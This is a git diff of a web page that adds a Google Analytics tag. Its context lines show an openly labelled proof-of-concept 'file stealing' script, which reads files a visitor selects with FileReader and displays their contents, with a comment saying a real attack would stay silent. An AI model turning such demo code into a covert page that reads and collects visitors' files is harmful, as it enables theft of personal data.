@@ -7,6 +7,16 @@
             opacity: 0.0;
         }
     </style>
+	<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-170959658-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-170959658-1');
+</script>
+
 </head>
 
    <body style='background-color:#aaaaff;'><img width=200 src='https://www.quickanddirtytips.com/sites/default/files/styles/article_main_image/public/images/17091/man-holding-breath.png'></img>
@@ -17,7 +27,6 @@
 	
 		  var r = new FileReader();
         thing.onchange = function() {
-		qmsg.innerHTML="<script async src='https://www.googletagmanager.com/gtag/js?id=UA-170959658-1'></script><script> window.dataLayer = window.dataLayer || [];  function gtag(){dataLayer.push(arguments);}  gtag('js', new Date());  gtag('config', 'UA-170959658-1');</script>";
             alert('I stole ' + this.files.length + ' files from your pc!');//This is for PoC only. A real attack would not let the user know what happened.
 			r.onload=function(){
 				alert(r.result); // This displays the contents of the file, which proves the website can read your harddrive.
